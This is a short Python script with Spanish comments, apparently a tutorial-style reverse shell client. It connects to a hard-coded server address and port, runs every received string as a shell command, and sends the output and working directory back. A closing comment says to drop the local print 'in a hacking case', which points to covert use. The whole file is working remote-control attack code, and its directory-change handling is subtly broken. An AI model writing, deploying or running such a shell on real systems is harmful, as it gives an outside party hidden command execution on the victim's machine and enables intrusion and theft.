import sys
import socket
import os
import subprocess

s=socket.socket()
host= '192.168.137.78'  # IP del server
port=9999 


s.connect((host, port))

while True:
    data= s.recv(1024)
    if  data[:2].decode('utf-8')== 'cd':
        os.chdir(data[:3].decode('utf-8'))
    
    if len(data)>0:
        cmd= subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        # el parametro Shell permite tener acceso a los comandos shell del cmd
        # stdout es el output del cmd, stdin es el input de cmd y el stderr es output de error del cmd 
        
        outputByte= cmd.stdout.read() + cmd.stderr.read()  #guardar la info Bytes
        outputStr= str(outputByte, 'utf-8')                 #convierte de Bytes a String
        currentWD=os.getcwd() + '>'                     #obtenemos el directorio de trabajo
        s.send(str.encode(outputStr + currentWD))       # Envia al Server

### Print en PC de Clinte. OBVIAR ES CASO DE HACKING
        print(outputStr)
